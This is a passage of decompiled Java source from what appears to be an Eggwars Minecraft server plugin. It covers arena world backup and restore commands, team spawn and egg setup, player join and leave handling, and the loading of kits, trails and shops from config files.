                                                                     Eggwars.this.filesManager.copyFile(var33.getWorldFolder(), new File(Eggwars.this.getDataFolder() + "/backup", var33.getName()));
                                                                     var1.sendMessage(Eggwars.this.customization.prefix + "Backup has been " + ChatColor.GREEN + "successfully" + ChatColor.GRAY + " created! took " + ChatColor.LIGHT_PURPLE + (System.currentTimeMillis() - var1x) + "ms!");
                                                                  }
                                                               }).runTaskAsynchronously(this);
                                                               return true;
                                                            } else if (!var29.equals("restore")) {
                                                               return true;
                                                            } else if (var33.getPlayers().isEmpty()) {
                                                               var39 = new File(this.getDataFolder() + "/backup", var33.getName());
                                                               if (!var39.exists()) {
                                                                  var1.sendMessage(this.customization.prefix + "Couldn't find a backup for that world!");
                                                                  return true;
                                                               } else {
                                                                  (new BukkitRunnable() {
                                                                     public void run() {
                                                                        var1.sendMessage(Eggwars.this.customization.prefix + "Restoring the world " + ChatColor.LIGHT_PURPLE + var33.getName() + ChatColor.GRAY + "!");
                                                                        final long var1x = System.currentTimeMillis();
                                                                        File var3 = var33.getWorldFolder();
                                                                        final Environment var4 = var33.getEnvironment();
                                                                        Bukkit.unloadWorld(var33, false);
                                                                        Eggwars.this.filesManager.deleteFile(var3);
                                                                        Eggwars.this.filesManager.copyFile(var39, var3);
                                                                        (new BukkitRunnable() {
                                                                           public void run() {
                                                                              Bukkit.createWorld((new WorldCreator(var39.getName())).environment(var4));
                                                                              var1.sendMessage(Eggwars.this.customization.prefix + "World " + ChatColor.AQUA + var39.getName() + ChatColor.GRAY + " has been " + ChatColor.GREEN + "successfully" + ChatColor.GRAY + " restored! took " + ChatColor.LIGHT_PURPLE + (System.currentTimeMillis() - var1x) + "ms!");
                                                                              var1.sendMessage(Eggwars.this.customization.prefix + "If the world didn't restore correctly, try using the restore command again!");
                                                                           }
                                                                        }).runTask(Eggwars.this.plugin);
                                                                     }
                                                                  }).runTaskAsynchronously(this);
                                                                  return true;
                                                               }
                                                            } else {
                                                               var1.sendMessage(this.customization.prefix + "The world contains players. so the world can't be restored!");
                                                               var43 = var33.getPlayers().iterator();

                                                               while(var43.hasNext()) {
                                                                  var38 = (Player)var43.next();
                                                                  var1.sendMessage(this.customization.prefix + "- " + var38.getName());
                                                               }

                                                               return true;
                                                            }
                                                         }
                                                      }
                                                   }
                                                }
                                             }
                                          }
                                       }
                                    }
                                 }
                              } else if (!this.checkSender(var1, false, var5.equals("removeteamspawn") ? "eggwars.removeteamspawn" : "eggwars.removeteamegg")) {
                                 return true;
                              } else if (var4.length < 3) {
                                 this.sendCommandUsage(var1, var5.equals("removeteamspawn") ? "Removeteamspawn" : "Removeteamegg", "<Arena> <Color>");
                                 return true;
                              } else {
                                 var29 = var4[1].toLowerCase();
                                 if (!this.arenas.containsKey(var29)) {
                                    var1.sendMessage(this.customization.prefix + "Couldn't find an arena with that name!");
                                    return true;
                                 } else {
                                    var31 = (Arena)this.arenas.get(var29);
                                    var8 = null;

                                    ChatColor var36;
                                    try {
                                       var36 = ChatColor.valueOf(var4[2].toUpperCase());
                                    } catch (IllegalArgumentException var25) {
                                       var1.sendMessage(this.customization.prefix + "Unknown team color!");
                                       return true;
                                    }

                                    if (var36 != ChatColor.BOLD && var36 != ChatColor.ITALIC && var36 != ChatColor.MAGIC && var36 != ChatColor.RESET && var36 != ChatColor.STRIKETHROUGH && var36 != ChatColor.UNDERLINE) {
                                       var40 = new File(this.getDataFolder() + "/arenas/" + var31.name, "locations.dat");
                                       var47 = YamlConfiguration.loadConfiguration(var40);
                                       if (var5.equals("removeteamspawn")) {
                                          if (!var47.contains("Teams." + var36.name() + ".Spawnpoint")) {
                                             var1.sendMessage(this.customization.prefix + "The team " + var36 + var36.name() + ChatColor.GRAY + " spawnpoint is not set!");
                                             return true;
                                          }

                                          var47.set("Teams." + var36.name() + ".Spawnpoint", (Object)null);
                                       } else {
                                          if (!var47.contains("Teams." + var36.name() + ".Egg-Location")) {
                                             var1.sendMessage(this.customization.prefix + "The team " + var36 + var36.name() + ChatColor.GRAY + " egg location is not set!");
                                             return true;
                                          }

                                          var47.set("Teams." + var36.name() + ".Egg-Location", (Object)null);
                                       }

                                       try {
                                          var47.save(var40);
                                       } catch (IOException var24) {
                                          var24.printStackTrace();
                                       }

                                       Team var50 = var31.getTeam(var36.name());
                                       if (var50 != null) {
                                          var31.teams.remove(var50);
                                          var50.unregister();
                                          var31.createTeamSelector();
                                          var31.updateItem(0);
                                       }

                                       var1.sendMessage(this.customization.prefix + "You have removed the team " + (var5.equals("removeteamspawn") ? "spawnpoint" : "egg location") + "!");
                                       return true;
                                    } else {
                                       var1.sendMessage(this.customization.prefix + "Invalid team color!");
                                       return true;
                                    }
                                 }
                              }
                           } else if (!this.checkSender(var1, true, var5.equals("setteamspawn") ? "eggwars.setteamspawn" : "eggwars.setteamegg")) {
                              return true;
                           } else if (var4.length < 3) {
                              this.sendCommandUsage(var1, var5.equals("setteamspawn") ? "Setteamspawn" : "Setteamegg", "<Arena> <Color>");
                              return true;
                           } else {
                              var6 = (Player)var1;
                              var7 = var4[1].toLowerCase();
                              if (!this.arenas.containsKey(var7)) {
                                 var6.sendMessage(this.customization.prefix + "Couldn't find an arena with that name!");
                                 return true;
                              } else {
                                 var8 = (Arena)this.arenas.get(var7);
                                 ChatColor var9 = null;

                                 try {
                                    var9 = ChatColor.valueOf(var4[2].toUpperCase());
                                 } catch (IllegalArgumentException var27) {
                                    var6.sendMessage(this.customization.prefix + "Unknown team color!");
                                    return true;
                                 }

                                 if (var9 != ChatColor.BOLD && var9 != ChatColor.ITALIC && var9 != ChatColor.MAGIC && var9 != ChatColor.RESET && var9 != ChatColor.STRIKETHROUGH && var9 != ChatColor.UNDERLINE) {
                                    Block var10 = null;
                                    Iterator var12 = var6.getLineOfSight((Set)null, 10).iterator();

                                    while(var12.hasNext()) {
                                       Block var11 = (Block)var12.next();
                                       var10 = var11;
                                       if (!var11.getType().equals(Material.AIR)) {
                                          break;
                                       }
                                    }

                                    if (var5.equals("setteamegg") && !var10.getType().equals(this.config.coreBlockType)) {
                                       var6.sendMessage(this.plugin.customization.prefix + "You must look at a " + this.config.coreBlockType.name() + " block to set it as the team egg!");
                                       return true;
                                    } else {
                                       File var48 = new File(this.getDataFolder() + "/arenas/" + var8.name, "locations.dat");
                                       YamlConfiguration var56 = YamlConfiguration.loadConfiguration(var48);
                                       Location var13 = var5.equals("setteamspawn") ? var6.getLocation() : var10.getLocation();
                                       String var14 = this.getStringFromLocation(var13, var5.equals("setteamspawn"));
                                       var56.set("Teams." + var9.name() + (var5.equals("setteamspawn") ? ".Spawnpoint" : ".Egg-Location"), var14);

                                       try {
                                          var56.save(var48);
                                       } catch (IOException var26) {
                                          var26.printStackTrace();
                                       }

                                       if (var56.contains("Teams." + var9.name() + ".Spawnpoint") && var56.contains("Teams." + var9.name() + ".Egg-Location")) {
                                          if (var8.getTeam(var9.name()) != null) {
                                             var8.updateTeam(var9.name(), this.getLocationFromString(var56.getString("Teams." + var9.name() + ".Spawnpoint")), this.getLocationFromString(var56.getString("Teams." + var9.name() + ".Egg-Location")));
                                          } else {
                                             var8.registerTeam(var9.name(), this.getLocationFromString(var56.getString("Teams." + var9.name() + ".Spawnpoint")), this.getLocationFromString(var56.getString("Teams." + var9.name() + ".Egg-Location")));
                                             var8.createTeamSelector();
                                          }

                                          var8.updateItem(0);
                                       }

                                       var6.sendMessage(this.customization.prefix + "You have set the " + (var5.equals("setteamspawn") ? "spawnpoint" : "egg location") + " for the " + var9 + var9.name() + ChatColor.GRAY + " team in the arena " + ChatColor.AQUA + var8.name + ChatColor.GRAY + " at " + this.getReadableLocationString(var13, true));
                                       return true;
                                    }
                                 } else {
                                    var6.sendMessage(this.customization.prefix + "Invalid team color!");
                                    return true;
                                 }
                              }
                           }
                        }
                     }
                  }
               }
            }
         }
      } else {
         return false;
      }
   }

   private boolean checkSender(CommandSender var1, boolean var2, String var3) {
      if (var2 && !(var1 instanceof Player)) {
         var1.sendMessage(this.customization.prefix + "You must be a player to use this command");
         return false;
      } else if (!var3.isEmpty() && !var1.hasPermission(var3)) {
         var1.sendMessage((String)this.customization.messages.get("No-Permission"));
         return false;
      } else {
         return true;
      }
   }

   private void sendCommandUsage(CommandSender var1, String var2, String var3, String... var4) {
      var1.sendMessage(this.customization.prefix + "Usage: /ew " + ChatColor.GREEN + var2 + ChatColor.GRAY + " " + var3);
      String[] var8 = var4;
      int var7 = var4.length;

      for(int var6 = 0; var6 < var7; ++var6) {
         String var5 = var8[var6];
         var1.sendMessage(this.customization.prefix + ChatColor.AQUA + "- " + ChatColor.GRAY + var5);
      }

   }

   protected List getPlayers(Collection var1) {
      ArrayList var2 = new ArrayList();
      Iterator var4 = var1.iterator();

      while(var4.hasNext()) {
         String var3 = (String)var4.next();
         if (Bukkit.getPlayer(var3) != null) {
            var2.add(Bukkit.getPlayer(var3));
         }
      }

      return var2;
   }

   protected String getStringFromLocation(Location var1, boolean var2) {
      return var1.getWorld().getName() + ", " + ((double)var1.getBlockX() + (var2 ? 0.5D : 0.0D)) + ", " + (var1.getBlockY() + (var2 ? 1 : 0)) + ", " + ((double)var1.getBlockZ() + (var2 ? 0.5D : 0.0D)) + ", " + var1.getYaw() + ", " + var1.getPitch();
   }

   protected Location getLocationFromString(String var1) {
      String[] var2 = var1.split(", ");
      World var3 = Bukkit.getWorld(var2[0]);
      double var4 = Double.valueOf(var2[1]);
      double var6 = Double.valueOf(var2[2]);
      double var8 = Double.valueOf(var2[3]);
      float var10 = Float.valueOf(var2[4]);
      float var11 = Float.valueOf(var2[5]);
      return new Location(var3, var4, var6, var8, var10, var11);
   }

   protected String getReadableLocationString(Location var1, boolean var2) {
      return "" + ChatColor.GREEN + ((double)var1.getBlockX() + (var2 ? 0.5D : 0.0D)) + ChatColor.GRAY + ", " + ChatColor.GREEN + (var1.getBlockY() + (var2 ? 1 : 0)) + ChatColor.GRAY + ", " + ChatColor.GREEN + ((double)var1.getBlockZ() + (var2 ? 0.5D : 0.0D));
   }

   protected boolean checkNumbers(String... var1) {
      try {
         String[] var5 = var1;
         int var4 = var1.length;

         for(int var3 = 0; var3 < var4; ++var3) {
            String var2 = var5[var3];
            Integer.parseInt(var2);
         }

         return true;
      } catch (NumberFormatException var6) {
         return false;
      }
   }

   protected void cageInventory(Inventory var1, boolean var2) {
      int var3;
      if (var2) {
         for(var3 = 0; var3 < var1.getSize(); ++var3) {
            var1.setItem(var3, this.pane_itemstack);
         }

      } else {
         for(var3 = 0; var3 < 9; ++var3) {
            var1.setItem(var3, this.pane_itemstack);
         }

         for(var3 = var1.getSize() - 9; var3 < var1.getSize(); ++var3) {
            var1.setItem(var3, this.pane_itemstack);
         }

         var3 = var1.getSize() / 9 - 2;
         if (var3 >= 1) {
            int var4;
            for(var4 = 9; var4 < 9 * var3 + 1; var4 += 9) {
               var1.setItem(var4, this.pane_itemstack);
            }

            for(var4 = 17; var4 < 9 * (var3 + 1); var4 += 9) {
               var1.setItem(var4, this.pane_itemstack);
            }

         }
      }
   }

   protected int getInventorySize(int var1) {
      return var1 < 10 ? 9 : (var1 < 19 ? 18 : (var1 < 28 ? 27 : (var1 < 37 ? 36 : (var1 < 46 ? 45 : 54))));
   }

   protected boolean compareItem(ItemStack var1, ItemStack var2) {
      return var1 != null && var2 != null && var1.getType().equals(var2.getType()) && var1.getItemMeta().equals(var2.getItemMeta());
   }

   protected boolean compareLocation(Location var1, Location var2) {
      return var1.getWorld().getName().equals(var2.getWorld().getName()) && var1.getX() == var2.getX() && var1.getY() == var2.getY() && var1.getZ() == var2.getZ();
   }

   protected void fireWorkEffect(Location var1, boolean var2) {
      if (this.config.fireworksEnabled) {
         final Firework var3 = (Firework)var1.getWorld().spawn(var1.clone().add(0.0D, 1.0D, 0.0D), Firework.class);
         FireworkMeta var4 = var3.getFireworkMeta();
         FireworkEffect var5 = FireworkEffect.builder().flicker(this.r.nextBoolean()).withColor(Color.fromBGR(this.r.nextInt(256), this.r.nextInt(256), this.r.nextInt(256))).withFade(Color.fromBGR(this.r.nextInt(256), this.r.nextInt(256), this.r.nextInt(256))).with(Type.values()[this.r.nextInt(Type.values().length)]).trail(this.r.nextBoolean()).build();
         var4.addEffect(var5);
         var3.setFireworkMeta(var4);
         if (var2) {
            Bukkit.getScheduler().scheduleSyncDelayedTask(this, new Runnable() {
               public void run() {
                  var3.detonate();
               }
            }, 2L);
         }

      }
   }

   protected ItemStack getSkull(String var1, String var2) {
      ItemStack var3 = new ItemStack(Material.SKULL_ITEM, 1, (short)SkullType.PLAYER.ordinal());
      SkullMeta var4 = (SkullMeta)var3.getItemMeta();
      if (this.config.loadSkinsOnSkulls) {
         var4.setOwner(var1);
      }

      var4.setDisplayName(var2);
      var3.setItemMeta(var4);
      return var3;
   }

   protected String getPercentageString(int var1) {
      return "" + (var1 < 40 ? ChatColor.RED : (var1 < 80 ? ChatColor.YELLOW : ChatColor.GREEN)) + var1 + "%";
   }

   protected void join(Player var1) {
      this.players.add(var1.getName());
      this.lobbyPlayers.add(var1.getName());
      this.protectedPlayers.add(var1.getName());
      PlayerData var2 = (PlayerData)this.playerData.get(var1.getName());
      var2.saveData(var1);
      var1.teleport(this.lobbyLocation);
      var2.clearPlayer(var1);
      this.updateJoinSigns();
      if (this.config.scoreboardTitleAnimationEnabled && this.scoreboardTitleAnimationTask == null) {
         this.scoreboardTitleAnimationTask = (new BukkitRunnable() {
            int index = 0;

            public void run() {
               String var1 = (String)Eggwars.this.config.scoreboardTitleAnimationFrames.get(this.index);
               if (++this.index >= Eggwars.this.plugin.config.scoreboardTitleAnimationFrames.size()) {
                  this.index = 0;
               }

               List var2 = (List)Eggwars.this.lobbyPlayers.clone();
               Iterator var4 = var2.iterator();

               while(var4.hasNext()) {
                  String var3 = (String)var4.next();
                  PlayerData var5 = (PlayerData)Eggwars.this.playerData.get(var3);
                  if (var5.lobbyScoreboard != null) {
                     var5.lobbyScoreboard.setName(var1);
                  }
               }

               var4 = Eggwars.this.arenas.values().iterator();

               while(var4.hasNext()) {
                  Arena var6 = (Arena)var4.next();
                  var6.scoreboard.setName(var1);
               }

            }
         }).runTaskTimer(this, (long)this.config.scoreboardTitleAnimationInterval, (long)this.config.scoreboardTitleAnimationInterval);
      }

      if (this.isOneGamePerServer()) {
         ((Arena)this.arenas.values().toArray()[0]).join(var1);
      } else {
         var1.sendMessage((String)this.customization.messages.get("Player-Join"));
      }

      ItemStack var3 = this.getSkull(var1.getName(), ChatColor.AQUA + var1.getName());

      int var4;
      for(var4 = 0; var4 < this.playerInviter.getSize(); ++var4) {
         if (this.playerInviter.addItem(var4, var3)) {
            return;
         }
      }

      var4 = this.playerInviter.addInventory(ChatColor.RED + "List #" + (this.playerInviter.getSize() + 1));
      this.playerInviter.setItem(var4, 49, this.back_itemstack);
      this.playerInviter.addItem(var4, var3);
   }

   protected void leave(Player var1, boolean var2) {
      String var3 = var1.getName();
      PlayerData var4 = (PlayerData)this.playerData.get(var3);
      if (this.isOneGamePerServer()) {
         var2 = true;
      }

      if (var4.arena != null) {
         var4.arena.leave(var1);
         if (!var2) {
            return;
         }
      }

      this.players.remove(var3);
      this.lobbyPlayers.remove(var3);
      this.protectedPlayers.remove(var3);
      var4.restoreData(var1);
      if (var4.party != null) {
         var4.party.leave(var1);
      }

      var1.sendMessage((String)this.customization.messages.get("Player-Leave"));
      this.updateJoinSigns();
      if (this.config.bungee_mode_enabled) {
         ByteArrayDataOutput var5 = ByteStreams.newDataOutput();
         var5.writeUTF("Connect");
         var5.writeUTF(this.config.bungee_mode_hub);
         var1.sendPluginMessage(this, "BungeeCord", var5.toByteArray());
      }

      if (this.scoreboardTitleAnimationTask != null && this.players.isEmpty()) {
         this.scoreboardTitleAnimationTask.cancel();
         this.scoreboardTitleAnimationTask = null;
      }

      for(int var11 = 0; var11 < this.playerInviter.getSize(); ++var11) {
         int[] var9;
         int var8 = (var9 = this.smartSlots).length;

         for(int var7 = 0; var7 < var8; ++var7) {
            int var6 = var9[var7];
            ItemStack var10 = this.playerInviter.getItem(var11, var6);
            if (var10 != null && ChatColor.stripColor(var10.getItemMeta().getDisplayName()).equals(var3)) {
               this.playerInviter.removeItem(var11, var6);
               return;
            }
         }
      }

   }

   protected void autojoin(Player var1, String var2) {
      PlayerData var3 = (PlayerData)this.plugin.playerData.get(var1.getName());
      int var4 = 1;
      if (var3.party != null) {
         var4 = var3.party.players.size();
         if (!var3.party.leaderName.equals(var1.getName())) {
            var1.sendMessage((String)this.customization.messages.get("Party-Must-Be-Leader"));
            return;
         }

         Iterator var6 = var3.party.players.iterator();

         while(var6.hasNext()) {
            String var5 = (String)var6.next();
            if (!this.plugin.lobbyPlayers.contains(var5)) {
               var1.sendMessage(((String)this.customization.messages.get("Party-Player-Not-Available")).replace("%member%", var5));
               return;
            }
         }
      }

      ArrayList var9 = new ArrayList();
      Iterator var7 = this.arenas.values().iterator();

      while(true) {
         Arena var10;
         do {
            do {
               do {
                  do {
                     do {
                        do {
                           if (!var7.hasNext()) {
                              if (var9.isEmpty()) {
                                 var1.sendMessage((String)this.customization.messages.get("No-Available-Arena"));
                                 return;
                              }

                              var10 = (Arena)var9.get(0);
                              Iterator var8 = var9.iterator();

                              while(var8.hasNext()) {
                                 Arena var11 = (Arena)var8.next();
                                 if (var11.players.size() > var10.players.size()) {
                                    var10 = var11;
                                 }
                              }

                              var10.join(var1);
                              return;
                           }

                           var10 = (Arena)var7.next();
                        } while(!var10.enabled);
                     } while(!var10.state.AVAILABLE());
                  } while(var10.teams.size() <= 1);
               } while(var10.players.size() + var4 > var10.teams.size() * var10.teamSize);
            } while(var2.equals("SOLO") && var10.teamSize != 1);
         } while(var2.equals("TEAM") && var10.teamSize < 2);

         var9.add(var10);
      }
   }

   protected void updateJoinSigns() {
      Iterator var2 = this.joinSigns.keySet().iterator();

      while(var2.hasNext()) {
         Location var1 = (Location)var2.next();
         if (var1.getBlock().getState() instanceof Sign) {
            Sign var3 = (Sign)var1.getBlock().getState();
            var3.setLine(3, String.valueOf(this.players.size()));
            var3.update(true);
         }
      }

   }

   protected String randomize(HashMap var1) {
      int var2 = 0;

      int var3;
      for(Iterator var4 = var1.values().iterator(); var4.hasNext(); var2 += var3) {
         var3 = (Integer)var4.next();
      }

      var3 = this.r.nextInt(var2);
      int var7 = 0;
      Iterator var6 = var1.keySet().iterator();

      while(var6.hasNext()) {
         String var5 = (String)var6.next();
         var7 += (Integer)var1.get(var5);
         if (var3 >= var2 - var7) {
            return var5;
         }
      }

      return null;
   }

   protected void delayedSetup() {
      Bukkit.getScheduler().scheduleSyncDelayedTask(this, new Runnable() {
         public void run() {
            Eggwars.this.arenas = new HashMap();
            File var1 = new File(Eggwars.this.getDataFolder(), "arenas");
            if (var1.isDirectory()) {
               File[] var5;
               int var4 = (var5 = var1.listFiles()).length;

               for(int var3 = 0; var3 < var4; ++var3) {
                  File var2 = var5[var3];
                  if (var2.isDirectory() && (new File(Eggwars.this.getDataFolder() + "/arenas/" + var2.getName(), "settings.yml")).exists() && (new File(Eggwars.this.getDataFolder() + "/arenas/" + var2.getName(), "locations.dat")).exists() && (new File(Eggwars.this.getDataFolder() + "/arenas/" + var2.getName(), "blocks.dat")).exists()) {
                     new Arena(Eggwars.this.plugin, var2.getName());
                  }
               }
            }

            Eggwars.this.updateArenasInventory();
            Iterator var9 = Eggwars.this.arenas.values().iterator();

            while(var9.hasNext()) {
               Arena var7 = (Arena)var9.next();
               if (!var7.state.equals(Enums.ArenaState.DISABLED)) {
                  Eggwars.this.rollbackManager.add(var7);
               }
            }

            Eggwars.this.joinSigns = new HashMap();
            FileConfiguration var8 = Eggwars.this.filesManager.getConfig("signs.yml");
            Location var6;
            String var10;
            Iterator var11;
            int var13;
            if (var8.getConfigurationSection("Signs.Join") != null && !var8.getConfigurationSection("Signs.Join").getKeys(false).isEmpty()) {
               var11 = var8.getConfigurationSection("Signs.Join").getKeys(false).iterator();

               while(var11.hasNext()) {
                  var10 = (String)var11.next();
                  var13 = Integer.valueOf(var10);
                  var6 = Eggwars.this.getLocationFromString(var8.getString("Signs.Join." + var10));
                  Eggwars.this.joinSigns.put(var6, var13);
               }
            }

            Eggwars.this.updateJoinSigns();
            Eggwars.this.topSigns = new HashMap();
            if (var8.getConfigurationSection("Signs.Top") != null && !var8.getConfigurationSection("Signs.Top").getKeys(false).isEmpty()) {
               var11 = var8.getConfigurationSection("Signs.Top").getKeys(false).iterator();

               while(var11.hasNext()) {
                  var10 = (String)var11.next();
                  var13 = Integer.valueOf(var10);
                  var6 = Eggwars.this.getLocationFromString(var8.getString("Signs.Top." + var10));
                  Eggwars.this.topSigns.put(var6, var13);
               }
            }

            if (Eggwars.this.hologramsManager != null && Eggwars.this.hologramsManager.leaderboardHologram != null) {
               Eggwars.this.hologramsManager.leaderboardHologram.delete();
            }

            Eggwars.this.hologramsManager = null;
            if (Bukkit.getPluginManager().isPluginEnabled("HolographicDisplays")) {
               Eggwars.this.hologramsManager = new HologramsManager(Eggwars.this.plugin);
               if (Eggwars.this.getConfig().contains("Holographic-Stats")) {
                  Eggwars.this.hologramsManager.setStats(Eggwars.this.getLocationFromString(Eggwars.this.getConfig().getString("Holographic-Stats")));
               }

               if (Eggwars.this.getConfig().contains("Holographic-Leaderboard")) {
                  Eggwars.this.hologramsManager.setLeaderboard(Eggwars.this.getLocationFromString(Eggwars.this.getConfig().getString("Holographic-Leaderboard")), false);
               }

               Bukkit.getConsoleSender().sendMessage(Eggwars.this.customization.prefix + "HolographicDisplays has been detected! HolographicDisplays features are now accessible..");
            }

            Eggwars.this.startLeaderboardUpdater();
            if (Eggwars.this.getConfig().contains("Lobby")) {
               var10 = Eggwars.this.getConfig().getString("Lobby").split(",")[0];
               if (Bukkit.getWorld(var10) == null) {
                  Bukkit.getConsoleSender().sendMessage(Eggwars.this.customization.prefix + "The lobby world seems to be unloaded! attempting to import it");
                  Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "ew worldmanager import " + var10);
               }

               Eggwars.this.lobbyLocation = Eggwars.this.getLocationFromString(Eggwars.this.getConfig().getString("Lobby"));
               if (Eggwars.this.config.bungee_mode_enabled) {
                  Iterator var14 = Eggwars.this.getOnlinePlayers().iterator();

                  while(var14.hasNext()) {
                     Player var12 = (Player)var14.next();
                     Eggwars.this.join(var12);
                  }
               }
            }

            Bukkit.getConsoleSender().sendMessage(Eggwars.this.customization.prefix + "Loaded " + ChatColor.AQUA + Eggwars.this.arenas.size() + ChatColor.GRAY + " arena(s)" + ChatColor.LIGHT_PURPLE + "  and " + ChatColor.AQUA + Eggwars.this.joinSigns.size() + ChatColor.GRAY + " join sign(s)" + ChatColor.LIGHT_PURPLE + " and " + ChatColor.AQUA + Eggwars.this.kits.size() + ChatColor.GRAY + " kit(s)" + ChatColor.LIGHT_PURPLE + " and " + ChatColor.AQUA + Eggwars.this.trails.size() + ChatColor.GRAY + " trail(s)" + ChatColor.LIGHT_PURPLE + " and " + ChatColor.AQUA + Eggwars.this.shop.getSize() + ChatColor.GRAY + " shop(s)" + ChatColor.LIGHT_PURPLE + " and " + ChatColor.AQUA + Eggwars.this.villagerShop.getShopsCount() + ChatColor.GRAY + " villager shop(s)" + ChatColor.LIGHT_PURPLE + " and " + ChatColor.AQUA + Eggwars.this.achievementsManager.getSize() + ChatColor.GRAY + " achievement(s)" + ChatColor.LIGHT_PURPLE + " and " + ChatColor.AQUA + Eggwars.this.broadcaster.messages.size() + ChatColor.GRAY + " broadcaster message(s)");
         }
      }, (long)this.getConfig().getInt("Load-Delay-Ticks"));
   }

   protected void mainSetup() {
      this.filesManager = new FilesManager(this);
      FileConfiguration var1 = this.filesManager.getConfig("customization.yml");
      this.customization = new Customization(var1);
      this.config = new Config(this);
      this.ranksManager = new RanksManager(this);
      this.rollbackManager.reset();
      this.quit_itemstack = this.getItemStack(var1.getString("Items.Quit"), false, true);
      this.play_itemstack = this.getItemStack(var1.getString("Items.Play"), false, true);
      this.shop_itemstack = this.getItemStack(var1.getString("Items.Shop"), false, true);
      this.profile_itemstack = this.getItemStack(var1.getString("Items.Profile"), false, true);
      this.party_itemstack = this.getItemStack(var1.getString("Items.Party"), false, true);
      this.teleporter_itemstack = this.getItemStack(var1.getString("Items.Teleporter"), false, true);
      this.autojoin_itemstack = this.getItemStack(var1.getString("Items.Autojoin"), false, true);
      this.back_itemstack = this.getItemStack(var1.getString("Items.Back"), false, true);
      this.teamselector_itemstack = this.getItemStack(var1.getString("Items.Team-Selector"), false, true);
      this.vote_itemstack = this.getItemStack(var1.getString("Items.Vote"), false, true);
      this.stats_itemstack = this.getItemStack(var1.getString("Items.Stats"), false, true);
      this.inventory_itemstack = this.getItemStack(var1.getString("Items.Inventory"), false, true);
      this.achievements_itemstack = this.getItemStack(var1.getString("Items.Achievements"), false, true);
      this.confirm_itemstack = this.getItemStack(var1.getString("Items.Confirm"), false, true);
      this.cancel_itemstack = this.getItemStack(var1.getString("Items.Cancel"), false, true);
      this.arenaSelector = new SmartInventory(this.plugin, ChatColor.RED + "Arenas");
      this.arenaSelector.addInventory(ChatColor.RED + "List #1");
      this.arenaSelector.setItem(0, 49, this.autojoin_itemstack);
      this.delayedSetup();
      this.kits = new HashMap();
      FileConfiguration var2 = this.filesManager.getConfig("kits.yml");
      if (var2.getConfigurationSection("Kits") == null || var2.getConfigurationSection("Kits").getKeys(false).isEmpty()) {
         this.createDefaultKits();
      }

      String[] var3 = new String[]{"boots", "leggings", "chestplate", "helmet"};
      Iterator var5 = var2.getConfigurationSection("Kits").getKeys(false).iterator();

      String var6;
      while(var5.hasNext()) {
         String var4 = (String)var5.next();
         var6 = "Kits." + var4 + ".";
         ItemStack var7 = this.getItemStack(var2.getString(var6 + "item"), false, false);
         String var8 = var2.getString(var6 + "permission");
         Enums.Rarity var9 = Enums.Rarity.valueOf(var2.getString(var6 + "rarity").toUpperCase());
         int var10 = var2.getInt(var6 + "value");
         ItemStack[] var11 = new ItemStack[4];

         for(int var12 = 0; var12 < var11.length; ++var12) {
            var11[var12] = this.getItemStack(var2.getString(var6 + var3[var12]), false, true);
         }

         ArrayList var38 = new ArrayList();
         Iterator var14 = var2.getStringList(var6 + "items").iterator();

         while(var14.hasNext()) {
            String var13 = (String)var14.next();
            var38.add(this.getItemStack(var13, true, true));
         }

         ArrayList var40 = new ArrayList();
         Iterator var15 = var2.getStringList(var6 + "description").iterator();

         while(var15.hasNext()) {
            String var41 = (String)var15.next();
            var40.add(ChatColor.translateAlternateColorCodes('&', var41));
         }

         this.kits.put(var4.toLowerCase(), new Kit(this, var4, var7, var8, var38, var11, var40, var9, var10));
      }

      this.trails = new HashMap();
      FileConfiguration var17 = this.filesManager.getConfig("trails.yml");
      if (var17.getConfigurationSection("Trails") == null || var17.getConfigurationSection("Trails").getKeys(false).isEmpty()) {
         this.createDefaultTrails();
      }

      Iterator var20 = var17.getConfigurationSection("Trails").getKeys(false).iterator();

      String var28;
      while(var20.hasNext()) {
         String var18 = (String)var20.next();
         String var22 = "Trails." + var18 + ".";
         ItemStack var25 = this.getItemStack(var17.getString(var22 + "item"), false, false);
         var28 = var17.getString(var22 + "permission");
         Enums.Rarity var29 = Enums.Rarity.valueOf(var17.getString(var22 + "rarity").toUpperCase());
         int var32 = var17.getInt(var22 + "value");
         this.trails.put(var18.toLowerCase(), new Trail(this, var18, var28, var32, var29, var25));
      }

      this.shop = new SmartInventory(this, ChatColor.BLUE + "Shop");
      FileConfiguration var19 = this.filesManager.getConfig("shop.yml");
      if (var19.getConfigurationSection("Shops") == null || var19.getConfigurationSection("Shops").getKeys(false).isEmpty()) {
         this.createDefaultShop();
      }

      Iterator var23 = var19.getConfigurationSection("Shops").getKeys(false).iterator();

      Iterator var31;
      while(var23.hasNext()) {
         var6 = (String)var23.next();
         int var26 = this.shop.addInventory(ChatColor.translateAlternateColorCodes('&', var6));
         var31 = var19.getConfigurationSection("Shops." + var6).getKeys(false).iterator();

         while(var31.hasNext()) {
            var28 = (String)var31.next();
            String var34 = var19.getString("Shops." + var6 + "." + var28).toLowerCase();
            ItemStack var39 = null;
            if (this.kits.containsKey(var34)) {
               var39 = ((Kit)this.kits.get(var34)).item;
            } else if (this.trails.containsKey(var34)) {
               var39 = ((Trail)this.trails.get(var34)).item;
            }

            if (var39 != null) {
               this.shop.setItem(var26, Integer.valueOf(var28), var39);
            }
         }
      }

      this.createDefaultAchievements();
      this.achievementsManager = new AchievementsManager(this);
      this.broadcaster.loadMessages(this.filesManager.getConfig("broadcaster.yml"));
      Material var21 = Material.valueOf(this.getConfig().getString("Mystery-Box.Block-Type").toUpperCase());
      int var24 = this.getConfig().getInt("Mystery-Box.Cost");
      HashMap var27 = new HashMap();
      var31 = this.getConfig().getStringList("Mystery-Box.Contents").iterator();

      while(var31.hasNext()) {
         var28 = (String)var31.next();
         var27.put(var28.split(" : ")[0], Integer.valueOf(var28.split(" : ")[1].replace("%", "")));
      }

      HashMap var30 = new HashMap();
      Iterator var36 = this.getConfig().getStringList("Mystery-Box.Rarities").iterator();

      while(var36.hasNext()) {
         String var33 = (String)var36.next();
         var30.put(var33.split(" : ")[0], Integer.valueOf(var33.split(" : ")[1].replace("%", "")));
      }

      this.mysteryBox = new MysteryBox(this, var21, var24, var27, var30);
      this.villagerShop = new VillagerShop(this, this.filesManager.getConfig("villager_shop.yml"));
      this.partyMenu = Bukkit.createInventory((InventoryHolder)null, 9, ChatColor.RED + "Select your option!");
      this.cageInventory(this.partyMenu, true);
      this.partyMenu.setItem(2, (new ItemStackBuilder(Material.BEACON)).setName(ChatColor.GREEN + "Create").addLore(ChatColor.GRAY + "Click to create a party!").build());
